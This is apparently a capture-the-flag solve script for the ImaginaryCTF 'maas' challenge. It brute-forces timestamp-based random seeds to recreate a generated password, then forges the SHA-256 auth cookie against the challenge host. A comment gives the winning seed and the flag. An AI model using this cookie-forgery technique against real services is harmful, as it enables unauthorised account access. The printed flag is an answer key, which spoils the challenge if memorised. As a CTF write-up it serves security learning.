import requests
import random
from hashlib import sha256
import time

URL = "http://maas.chal.imaginaryctf.org"

for i in range(1657964775, 1657964775+2):
    for j in range(0, 100):
        temp = f".{j}"
        if len(temp) == 2:
            temp = f".0{j}"
        print(round(float(str(i) + temp), 2))
        random.seed(round(float(str(i) + temp), 2))
        password = "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(30)])
        cookie = sha256(password.encode()).hexdigest()

        r = requests.get(URL + "/home", cookies = {"auth": cookie})
        # print(r.text)
        if "ictf" in r.text:
            print(r.text)
            exit(1)
# Found with: 1657964775.76
# ictf{d0nt_use_uuid1_and_please_generate_passw0rds_securely_192bfa4d}